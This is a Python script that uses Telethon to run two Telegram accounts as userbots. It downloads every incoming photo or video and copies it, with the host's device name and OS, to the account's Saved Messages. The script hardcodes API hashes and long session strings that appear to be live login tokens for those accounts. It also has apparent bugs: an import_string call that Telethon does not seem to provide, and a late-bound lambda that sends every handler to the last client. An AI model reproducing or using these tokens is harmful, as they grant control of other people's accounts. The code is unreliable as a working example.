import os
import platform
import asyncio
from telethon import TelegramClient, events

# إعداد الحسابات مع ملفات الجلسات
accounts = [
    {
        "api_id": 28410556,
        "api_hash": "04815754452fdf2b6eaba082c156222e",
        "session_data": "1ApWapzMBu10Hf0Uo0abx2AIaYfkgD5r-5UWPRK5Q-VNAS8Vt5r8srpnjhj0BfZM7qHnZgoGT8e9j3EOTJxpeOiFb_9x_IvoML7MpoWM1Tr3KOTXZ7RamU2ip3tG5sCUAYnGmB8OnVRhE0Zti8sYeaD9bw2Rp1nA0a4FSn6hSl5QROTnkbeCqK-K2Dt-MbpO6g8XQHLEKpW3AMfotXUeBgTTVltyhaBzBuyVh2G2XceJceyyAqFCllgljRtfcVJUDI3SJOVR6-bSExYuGmXN3yjxfJ-od_vxNd3J229bn_H8I3cn59kvEIesXBVi60rSp7jR7M0zYBMqEvAEZ3w0uf0u94zNk-7U=",  # ملف الجلسة للحساب الأول
        "username": "baniqi1"
    },
    {
        "api_id": 22257686,
        "api_hash": "6fe90d5beeb1f4b01ddc58eaeee45343",
        "session_data": "1ApWapzMBuw1A7xIMa7kAcQCeKKl-uFxtBg6ZGBrTVscvy-2H9-fFZ9lCWg7HHlvUFqiXaISDrKTnxrKDmEayeZd_KFzO_ow8KRE9ZXqN_OaM3n73JA7WeB-bIgMhN34Qc5Gh9ivw0_lpNhjJYV15j693isGmVcLui8OLjcC8A3epH14PFR8Q4tHMljnDMsztWS2gBVOFrJbJ8KeeQG_IhbzOehqEiivh5vYjwgyebZjosBiCCvjMaqMGswk6PxFC8ZNiFFDgnjyJmGs-InTrRsjke8X2q0bgLRpGdC1BSliTpGBov0JjIbrZ8GTljOUzbOdGaMXQ4J8Cr1fbed0yvCdz5wRf-4Y=",  # ملف الجلسة للحساب الثاني
        "username": "doctor"
    }
]

# التأكد من وجود المجلد لحفظ الوسائط
os.makedirs("saved_media", exist_ok=True)

# تعريف الدالة للتعامل مع الرسائل
async def handle_message(client, event, username):
    if event.photo:
        photo = await event.download_media(file="saved_media/")
        system_info = platform.system()
        node_name = platform.node()

        custom_message = f"\U0001F496 {username} جابلك صورة حب! \U0001F496\n"
        custom_message += f"\u2728 الجهاز: {node_name}\n\u2728 النظام: {system_info}"

        await client.send_message('me', custom_message)
        await client.send_file('me', photo, caption="\U0001F4E3 وين صورك؟ يلا شارك!")
    elif event.video:
        video = await event.download_media(file="saved_media/")
        system_info = platform.system()
        node_name = platform.node()

        custom_message = f"\U0001F4F9 {username} جابلك فيديو حب! \U0001F4F9\n"
        custom_message += f"\u2728 الجهاز: {node_name}\n\u2728 النظام: {system_info}"

        await client.send_message('me', custom_message)
        await client.send_file('me', video, caption="\U0001F4E3 وين فيديوهاتك؟ يلا شارك!")

# تشغيل كل الحسابات
async def main():
    clients = []

    # إنشاء العملاء وربط الأحداث
    for account in accounts:
        client = TelegramClient(
            session=f"{account['username']}_session",
            api_id=account['api_id'],
            api_hash=account['api_hash'],
            device_model=account['username']
        )
        
        # تحميل بيانات الجلسة مباشرة
        await client.connect()
        if not await client.is_user_authorized():
            await client.import_string(account['session_data'])

        username = account['username']
        client.add_event_handler(lambda event, acc=username: handle_message(client, event, acc), events.NewMessage)
        clients.append(client)

    # بدء جميع العملاء
    print("البوت قيد التشغيل لجميع الحسابات...")
    await asyncio.gather(*(client.run_until_disconnected() for client in clients))

# تشغيل البرنامج
asyncio.run(main())
